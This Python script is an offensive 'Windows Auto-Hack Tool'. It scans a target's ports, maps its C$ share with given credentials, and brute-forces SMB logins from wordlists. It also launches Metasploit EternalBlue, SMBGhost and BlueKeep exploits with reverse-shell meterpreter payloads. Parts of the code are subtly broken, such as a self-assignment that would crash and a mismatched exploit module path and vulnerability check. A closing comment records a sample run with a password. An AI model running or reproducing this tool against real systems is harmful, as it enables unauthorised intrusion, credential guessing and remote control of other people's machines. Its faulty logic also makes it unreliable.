import argparse
import nmap
import json
import subprocess

def main():
    parser = argparse.ArgumentParser(
            prog="WinRaider",
            description="""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║   ██╗    ██╗██╗███╗   ██╗██████╗  █████╗ ██╗██████╗ ███████╗ ║
    ║   ██║    ██║██║████╗  ██║██╔══██╗██╔══██╗██║██╔══██╗██╔════╝ ║
    ║   ██║ █╗ ██║██║██╔██╗ ██║██████╔╝███████║██║██║  ██║█████╗   ║
    ║   ██║███╗██║██║██║╚██╗██║██╔══██╗██╔══██║██║██║  ██║██╔══╝   ║
    ║   ╚███╔███╔╝██║██║ ╚████║██║  ██║██║  ██║██║██████╔╝███████╗ ║
    ║    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝ ║
    ║                                                               ║
    ║              Windows Auto-Hack Tool v2.0                      ║
    ║              Author: Abed                                     ║
    ╚═══════════════════════════════════════════════════════════════╝
            """,
            epilog="""
    [+] Examples:
        python winraider.py -t 192.168.0.101 -u Abed -p password
        python winraider.py -t 192.168.0.101 -w passwords.txt --users usernames.txt
        python winraider.py -t 192.168.0.101 --msfpath "C:\\metasploit\\msfconsole"

    [+] Wordlist Format:
        - Each username/password on a new line
        - No extra spaces or empty lines

    [+] Supported Ports:
        445  - SMB (Primary)
        3389 - RDP
        5985 - WinRM HTTP
        5986 - WinRM HTTPS
        139  - NetBIOS
        22   - SSH
            """,
            formatter_class=argparse.RawDescriptionHelpFormatter
        )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    
    parser.add_argument('-w', '--wordlist', default='wordlists/passwords.txt', help='Password wordlist for brute force (default: wordlists/passwords.txt)')
    parser.add_argument('--users', default='wordlists/users.txt', help='Username wordlist for brute force (default: wordlists/users.txt)')
    
    parser.add_argument('--msfpath', help='Path to Metasploit msfconsole')
    parser.add_argument('--lhost', help='Local host IP for Metasploit reverse shells')
    
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (minimal output)')
    
    args = parser.parse_args()
    
    if not args.quiet:
        print(parser.description)
    print(f"\n[+] Target: {args.target}")
    if args.username:
        print(f"[+] Username: {args.username}")
    if args.verbose:
        print("[+] Verbose mode enabled")
    
    scanner = nmap.PortScanner()
 
    def nmap_scan():
        ip = args.target
        ports = '445,3389,5985,5986,139,135,22'
        print(f"Scanning machine({ip}) ...")
        scanner.scan(ip, ports)

        hosts_data = []
        for host in scanner.all_hosts():
            print(f'Host: {host} ({scanner[host].hostname()})')
            print(f'State: {scanner[host].state()}')
            host_info = {'host': host, 'hostname': scanner[host].hostname(), 'state': scanner[host].state(), 'protocols': []}
            for proto in scanner[host].all_protocols():
                print(f'Protocol: {proto}')
                protocol_info = {'protocol': proto, 'ports': []}
                lport = scanner[host][proto].keys()
                for port in sorted(lport):
                    state = scanner[host][proto][port]['state']
                    print(f'Port {port}: {state}')
                    protocol_info['ports'].append({'port': port, 'state': state})
                
                host_info['protocols'].append(protocol_info)
            
            hosts_data.append(host_info)
        json_data = json.dumps(hosts_data)
        return json_data

    def filtered_json_ports():
        json_data = nmap_scan()
        if isinstance(json_data, str):
            data = json.loads(json_data)
        else:
            data = json_data
        
        result = {}
        
        for host_entry in data:
            host_ip = host_entry.get("host", "")
            open_ports = []
            
            for protocol in host_entry.get("protocols", []):
                for port_info in protocol.get("ports", []):
                    if port_info.get("state") == "open":
                        open_ports.append(port_info.get("port"))
            if open_ports:
                result = open_ports
            else:
                print("No open ports failed to hack!")
        return result

    open_ports = filtered_json_ports()
    def hack_with_cercredentials():
        ip = args.target
        name = args.username
        passw = args.password
        
        port_priorities = {
            445: "SMB - Full File Access (Map C$ drive)",
            3389: "RDP - Full GUI Desktop Control",
            5985: "WinRM HTTP - Silent Command Shell",
            5986: "WinRM HTTPS - Encrypted Command Shell",
            139: "NetBIOS - Fallback File Access",
            22: "SSH - Linux-Style Shell"
        }
        
        available = [p for p in open_ports if p in port_priorities]
        
        if not available:
            print("[-] No exploitable ports found.")
            return
        
        print("\n[+] Available ports to attack:")
        for i, port in enumerate(available, 1):
            print(f"    {i}. {port} ({port_priorities[port]})")
        
        print("\n[?] Choose an option:")
        print("    1. Let the tool choose the best port automatically")
        print("    2. Choose a specific port (enter number)")
        
        choice = input("\n[?] Enter 1 or 2: ").strip()
        
        if choice == "2":
            try:
                port_index = int(input(f"[?] Enter port number (1-{len(available)}): ").strip()) - 1
                if port_index < 0 or port_index >= len(available):
                    print("[-] Invalid selection. Using automatic choice.")
                    target_port = available[0]
                else:
                    target_port = available[port_index]
            except:
                print("[-] Invalid input. Using automatic choice.")
                target_port = available[0]
        else:
            if 445 in available:
                target_port = 445
            elif 3389 in available:
                target_port = 3389
            elif 5985 in available:
                target_port = 5985
            elif 5986 in available:
                target_port = 5986
            elif 139 in available:
                target_port = 139
            elif 22 in available:
                target_port = 22
            else:
                target_port = available[0]
        
        print(f"\n[+] Attacking via port {target_port} ({port_priorities[target_port]})...")
        
        if target_port == 445:
            result = subprocess.run(
                ['net', 'use', 'Z:', f'\\\\{ip}\\C$', f'/user:{name}', passw],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print(f"[+] SUCCESS! Mapped \\\\{ip}\\C$ to Z: drive.")
            else:
                print(f"[-] Failed: {result.stderr}")
        
        elif target_port == 3389:
            print(f"[+] Launching RDP connection to {ip}...")
            subprocess.Popen(['mstsc', '/v:' + ip])
            print(f"[+] Login with: {name} / {passw}")
        
        elif target_port == 5985:
            result = subprocess.run(
                ['winrs', '-r:http://' + ip + ':5985', '-u:' + name, '-p:' + passw, 'cmd', '/c', 'whoami'],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print(f"[+] SUCCESS! WinRM shell established.")
                print(f"[+] Output: {result.stdout}")
                print(f"[+] Interactive: winrs -r:http://{ip}:5985 -u:{name} -p:{passw} cmd")
            else:
                print(f"[-] Failed: {result.stderr}")
        
        elif target_port == 5986:
            result = subprocess.run(
                ['winrs', '-r:https://' + ip + ':5986', '-u:' + name, '-p:' + passw, 'cmd', '/c', 'whoami'],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print(f"[+] SUCCESS! Secure WinRM shell established.")
                print(f"[+] Output: {result.stdout}")
                print(f"[+] Interactive: winrs -r:https://{ip}:5986 -u:{name} -p:{passw} cmd")
            else:
                print(f"[-] Failed: {result.stderr}")
        
        elif target_port == 139:
            result = subprocess.run(
                ['net', 'use', 'Y:', f'\\\\{ip}\\C$', f'/user:{name}', passw],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print(f"[+] SUCCESS! Mapped \\\\{ip}\\C$ to Y: drive (NetBIOS).")
            else:
                print(f"[-] Failed: {result.stderr}")
        
        elif target_port == 22:
            result = subprocess.run(
                ['ssh', '-o', 'StrictHostKeyChecking=no', f'{name}@{ip}', 'whoami'],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                print(f"[+] SUCCESS! SSH connection established.")
                print(f"[+] Output: {result.stdout}")
                print(f"[+] Interactive: ssh {name}@{ip}")
            else:
                print(f"[-] Failed: {result.stderr}")
        
        print("\n[+] Attack complete.")
    
    def hack_without_credentials():
        ip = args.target
        open_ports = open_ports
        
        msf_path = None
        if args.msfpath:
            msf_path = args.msfpath
        else:
            check = subprocess.run(['where', 'msfconsole'], capture_output=True, text=True)
            if check.returncode == 0:
                msf_path = check.stdout.strip().split('\n')[0]
        
        port_priorities = {
            445: "SMB - EternalBlue (MS17-010) / SMBGhost",
            3389: "RDP - BlueKeep (CVE-2019-0708)",
            5985: "WinRM - No-auth access (rare)",
            5986: "WinRM HTTPS - No-auth access (rare)",
            139: "NetBIOS - Info disclosure",
            22: "SSH - Weak credentials / CVE-2016-6210"
        }
        
        available = [p for p in open_ports if p in port_priorities]
        
        if not available:
            print("[-] No exploitable ports found without credentials.")
            return
        
        print("\n[+] Available ports to attack without credentials:")
        for i, port in enumerate(available, 1):
            print(f"    {i}. {port} ({port_priorities[port]})")
        
        print("\n[?] Choose an option:")
        print("    1. Let the tool choose the best port automatically")
        print("    2. Choose a specific port (enter number)")
        
        choice = input("\n[?] Enter 1 or 2: ").strip()
        
        if choice == "2":
            try:
                port_index = int(input(f"[?] Enter port number (1-{len(available)}): ").strip()) - 1
                if port_index < 0 or port_index >= len(available):
                    print("[-] Invalid selection. Using automatic choice.")
                    target_port = available[0]
                else:
                    target_port = available[port_index]
            except:
                print("[-] Invalid input. Using automatic choice.")
                target_port = available[0]
        else:
            if 445 in available:
                target_port = 445
            elif 3389 in available:
                target_port = 3389
            elif 5985 in available:
                target_port = 5985
            elif 5986 in available:
                target_port = 5986
            elif 139 in available:
                target_port = 139
            elif 22 in available:
                target_port = 22
            else:
                target_port = available[0]
        
        print(f"\n[+] Attacking via port {target_port} ({port_priorities[target_port]})...")
        
        if target_port == 445:
            print("[+] Checking for EternalBlue (MS17-010)...")
            result = subprocess.run(
                ['nmap', '-p', '445', '--script', 'smb-vuln-ms17-010', ip],
                capture_output=True,
                text=True
            )
            if "VULNERABLE" in result.stdout:
                print("[!] EternalBlue VULNERABLE!")
                if msf_path:
                    print("[+] Launching Metasploit EternalBlue exploit...")
                    rc_file = f"""
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS {ip}
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST {args.lhost or '192.168.0.0'}
    run
    """
                    with open('eternalblue.rc', 'w') as f:
                        f.write(rc_file)
                    subprocess.Popen([msf_path, '-r', 'eternalblue.rc'])
                else:
                    print("[-] Metasploit not found. Install or provide path with --msfpath")
            else:
                print("[-] Not vulnerable to EternalBlue.")
                print("[+] Checking for SMBGhost (CVE-2020-0796)...")
                result2 = subprocess.run(
                    ['nmap', '-p', '445', '--script', 'smb-vuln-cve-2020-0796', ip],
                    capture_output=True,
                    text=True
                )
                if "VULNERABLE" in result2.stdout:
                    print("[!] SMBGhost VULNERABLE!")
                    if msf_path:
                        print("[+] Launching Metasploit SMBGhost exploit...")
                        rc_file = f"""
    use exploit/windows/smb/cve_2020_0796_bluekeep
    set RHOSTS {ip}
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST {args.lhost or '192.168.0.0'}
    run
    """
                        with open('smbghost.rc', 'w') as f:
                            f.write(rc_file)
                        subprocess.Popen([msf_path, '-r', 'smbghost.rc'])
                    else:
                        print("[-] Metasploit not found. Install or provide path with --msfpath")
                else:
                    print("[-] Not vulnerable to SMBGhost.")
        
        elif target_port == 3389:
            print("[+] Checking for BlueKeep (CVE-2019-0708)...")
            result = subprocess.run(
                ['nmap', '-p', '3389', '--script', 'rdp-vuln-ms12-020', ip],
                capture_output=True,
                text=True
            )
            if "VULNERABLE" in result.stdout:
                print("[!] BlueKeep VULNERABLE!")
                if msf_path:
                    print("[+] Launching Metasploit BlueKeep exploit...")
                    rc_file = f"""
    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    set RHOSTS {ip}
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST {args.lhost or '192.168.0.0'}
    run
    """
                    with open('bluekeep.rc', 'w') as f:
                        f.write(rc_file)
                    subprocess.Popen([msf_path, '-r', 'bluekeep.rc'])
                else:
                    print("[-] Metasploit not found. Install or provide path with --msfpath")
            else:
                print("[-] Not vulnerable to BlueKeep.")
        
        elif target_port == 5985:
            print("[+] Checking for WinRM no-auth access...")
            result = subprocess.run(
                ['nmap', '-p', '5985', '--script', 'winrm-enum', ip],
                capture_output=True,
                text=True
            )
            if "Guest" in result.stdout or "Administrator" in result.stdout:
                print("[!] WinRM may have no-auth access!")
                print("[+] Attempting to connect...")
                subprocess.Popen(['winrs', '-r:http://' + ip + ':5985', 'cmd'])
            else:
                print("[-] WinRM requires authentication.")
        
        elif target_port == 5986:
            print("[+] Checking for WinRM HTTPS no-auth access...")
            result = subprocess.run(
                ['nmap', '-p', '5986', '--script', 'winrm-enum', ip],
                capture_output=True,
                text=True
            )
            if "Guest" in result.stdout or "Administrator" in result.stdout:
                print("[!] WinRM HTTPS may have no-auth access!")
                print("[+] Attempting to connect...")
                subprocess.Popen(['winrs', '-r:https://' + ip + ':5986', 'cmd'])
            else:
                print("[-] WinRM HTTPS requires authentication.")
        
        elif target_port == 139:
            print("[+] Checking for NetBIOS info disclosure...")
            result = subprocess.run(
                ['nmap', '-p', '139', '--script', 'nbstat', ip],
                capture_output=True,
                text=True
            )
            if "NETBIOS" in result.stdout or "WORKGROUP" in result.stdout:
                print("[!] NetBIOS information leaked!")
                print(f"[+] Output:\n{result.stdout}")
            else:
                print("[-] No NetBIOS info leaked.")
        
        elif target_port == 22:
            print("[+] Checking for SSH vulnerabilities...")
            result = subprocess.run(
                ['nmap', '-p', '22', '--script', 'ssh*', ip],
                capture_output=True,
                text=True
            )
            if "CVE-2016-6210" in result.stdout:
                print("[!] SSH CVE-2016-6210 (User Enumeration) VULNERABLE!")
                print("[+] Attempting user enumeration...")
                subprocess.run(['nmap', '-p', '22', '--script', 'ssh-enum-users', ip], capture_output=True, text=True)
            elif "CVE-2018-15473" in result.stdout:
                print("[!] SSH CVE-2018-15473 (User Enumeration) VULNERABLE!")
                subprocess.run(['nmap', '-p', '22', '--script', 'ssh-enum-users', ip], capture_output=True, text=True)
            else:
                print("[-] No SSH vulnerabilities detected.")
    
    print("\n[+] Vulnerability check complete.")

    def bruit_force():
        ip = args.target
        userlist = args.users
        passlist = args.wordlist
        
        try:
            with open(userlist, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"[-] Username wordlist not found: {userlist}")
            userlist = input("[?] Enter path to username wordlist: ").strip()
            if not userlist:
                print("[-] No wordlist provided. Exiting.")
                return
            try:
                with open(userlist, 'r', encoding='utf-8') as f:
                    usernames = [line.strip() for line in f.readlines() if line.strip()]
            except FileNotFoundError:
                print("[-] File not found. Exiting.")
                return
        
        try:
            with open(passlist, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"[-] Password wordlist not found: {passlist}")
            passlist = input("[?] Enter path to password wordlist: ").strip()
            if not passlist:
                print("[-] No wordlist provided. Exiting.")
                return
            try:
                with open(passlist, 'r', encoding='utf-8') as f:
                    passwords = [line.strip() for line in f.readlines() if line.strip()]
            except FileNotFoundError:
                print("[-] File not found. Exiting.")
                return
        
        if not usernames or not passwords:
            print("[-] Wordlists are empty.")
            return
        
        print(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
        print(f"[+] Total combinations: {len(usernames) * len(passwords)}")
        
        found = False
        attempt = 0
        total = len(usernames) * len(passwords)
        
        for username in usernames:
            for password in passwords:
                attempt += 1
                print(f"[*] Attempt {attempt}/{total}: {username}:{password}")
                
                result = subprocess.run(
                    ['net', 'use', 'Z:', f'\\\\{ip}\\C$', f'/user:{username}', password],
                    capture_output=True,
                    text=True
                )
                
                if result.returncode == 0:
                    print(f"\n[+] SUCCESS! Valid credentials found: {username}:{password}")
                    args.username = username
                    args.password = password
                    found = True
                    break
                
                subprocess.run(['net', 'use', 'Z:', '/delete'], capture_output=True, text=True)
            
            if found:
                break
        
        subprocess.run(['net', 'use', 'Z:', '/delete'], capture_output=True, text=True)
        
        if not found:
            print("\n[-] No valid credentials found.")
            return
        
        print("\n[+] Credentials saved. Launching authenticated attack...")
        hack_with_cercredentials()

    def hack():
        username = args.username
        passw = args.password
        
        if username and passw:
            print("[+] Credentials provided. Attempting authenticated attack...")
            hack_with_cercredentials()
        else:
            print("[!] No credentials provided.")
            print("[?] Attempting unauthenticated attacks (vulnerability scanning)...")
            hack_without_credentials()
        
        while True:
            q = input("\n[?] Failed to hack. Do you want to brute force the credentials? (y/n): ").strip().lower()
            
            if q == "n":
                print("[-] Exiting.")
                return
            elif q == "y":
                bruit_force()
            else:
                print("[-] Invalid input. Please enter 'y' or 'n'.")
    hack()

if __name__ == "__main__":
    main()

# python winraider.py -t 192.168.3.9 -u Abed -p nullait
# [135, 139, 445]
# DESKTOP-HLT4R7F